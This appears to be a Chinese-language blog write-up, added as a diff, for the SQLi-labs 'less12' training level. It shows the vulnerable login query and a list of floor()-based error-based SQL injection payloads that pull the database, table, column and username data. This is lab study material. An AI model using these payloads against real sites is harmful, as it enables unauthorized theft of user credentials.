@@ -1,0 +1,20 @@
+<hr>
+<h2 id="title-less12url-https-www-yuque-com-u29002979-ep2zrx-ieg6hqs4seu4p47p"><a href="#title-less12url-https-www-yuque-com-u29002979-ep2zrx-ieg6hqs4seu4p47p" class="headerlink" title="title: less12url: https://www.yuque.com/u29002979/ep2zrx/ieg6hqs4seu4p47p"></a>title: less12<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/ieg6hqs4seu4p47p">https://www.yuque.com/u29002979/ep2zrx/ieg6hqs4seu4p47p</a></h2><pre><code class="bash">$uname=&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;
+    $passwd=&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; 
+    @$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;
+</code></pre>
+<p><code>1&quot;</code></p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) and password&#x3D;(“”) LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>用**”)**闭合<br>1”)<br>与Less11的区别就是闭合方式的不一样，注入方式完全一样。 <a name="LDkbm"></a></p>
+<h1 id="试试报错注入"><a href="#试试报错注入" class="headerlink" title="试试报错注入"></a>试试报错注入</h1><p>之前用过了 extractvalue() 函数， updatexml()函数 ，现在试试 floor()函数&amp;#x20;<br><code>-1&quot;) union select count(*),concat(0x7e,database(),0x7e,**floor(rand(0)*2)**)x from information_schema.tables **group by x**-- +</code></p>
+<pre><code class="bash">爆破数据库
+-1&quot;) union select count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x-- +
+爆破数据表
+-1&quot;) union select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x-- +
+爆破字段表
+-1&quot;) union select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x-- +
+爆破字段
+-1&quot;) union select count(*),concat(0x7e,(select username from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x-- +
+</code></pre>
